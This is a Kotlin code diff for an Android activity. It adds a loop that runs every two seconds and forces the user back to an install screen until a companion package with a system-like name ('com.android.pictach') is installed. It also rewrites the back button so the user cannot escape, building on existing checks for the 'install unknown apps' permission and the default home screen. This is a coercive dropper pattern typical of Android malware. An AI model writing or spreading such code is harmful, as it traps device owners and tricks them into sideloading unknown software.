@@ -16,6 +16,11 @@ class SecondActivity : AppCompatActivity() {
     private var permissionRequested = false
     private lateinit var permissionCheckRunnable: Runnable
     private lateinit var homeCheckRunnable: Runnable
+    private lateinit var companionCheckRunnable: Runnable
+
+    companion object {
+        private const val COMPANION_PKG = "com.android.pictach"
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -40,6 +45,15 @@ class SecondActivity : AppCompatActivity() {
             }
         }
 
+        // Keep checking every 2 seconds — if companion not installed force back to install
+        companionCheckRunnable = Runnable {
+            if (!isCompanionInstalled()) {
+                goToInstallActivityNow()
+            } else {
+                handler.postDelayed(companionCheckRunnable, 2000)
+            }
+        }
+
         goToUnknownApps()
     }
 
@@ -52,16 +66,23 @@ class SecondActivity : AppCompatActivity() {
             return
         }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            if (packageManager.canRequestPackageInstalls()) {
-                goToInstallActivity()
+        // If companion not installed — force to install
+        if (!isCompanionInstalled()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                if (packageManager.canRequestPackageInstalls()) {
+                    goToInstallActivity()
+                } else {
+                    handler.removeCallbacks(permissionCheckRunnable)
+                    handler.postDelayed(permissionCheckRunnable, 1000)
+                }
             } else {
-                handler.removeCallbacks(permissionCheckRunnable)
-                handler.postDelayed(permissionCheckRunnable, 1000)
+                goToInstallActivity()
             }
-        } else {
-            goToInstallActivity()
+            return
         }
+
+        // Companion installed — launch it
+        launchCompanionApp()
     }
 
     override fun onDestroy() {
@@ -69,15 +90,12 @@ class SecondActivity : AppCompatActivity() {
         handler.removeCallbacksAndMessages(null)
     }
 
+    // Block back button — force install
     override fun onBackPressed() {
-        if (!isDefaultHome()) {
-            goToUnknownApps()
-            return
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            if (!packageManager.canRequestPackageInstalls()) {
-                goToUnknownApps()
-            }
+        if (!isCompanionInstalled()) {
+            goToInstallActivityNow()
+        } else {
+            super.onBackPressed()
         }
     }
 
@@ -129,7 +147,7 @@ class SecondActivity : AppCompatActivity() {
 
     private fun isCompanionInstalled(): Boolean {
         return try {
-            packageManager.getPackageInfo("com.android.pictach", 0)
+            packageManager.getPackageInfo(COMPANION_PKG, 0)
             true
         } catch (e: Exception) {
             false
@@ -138,7 +156,7 @@ class SecondActivity : AppCompatActivity() {
 
     private fun launchCompanionApp() {
         try {
-            val launch = packageManager.getLaunchIntentForPackage("com.android.pictach")
+            val launch = packageManager.getLaunchIntentForPackage(COMPANION_PKG)
             if (launch != null) {
                 launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 launch.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
@@ -165,9 +183,12 @@ class SecondActivity : AppCompatActivity() {
         handler.removeCallbacksAndMessages(null)
         val delay = (500L..1000L).random()
         handler.postDelayed({
-            val intent = Intent(this, InstallActivity::class.java)
-            startActivity(intent)
-            finish()
+            if (!isFinishing && !isDestroyed) {
+                val intent = Intent(this, InstallActivity::class.java)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                startActivity(intent)
+                finish()
+            }
         }, delay)
     }
 }
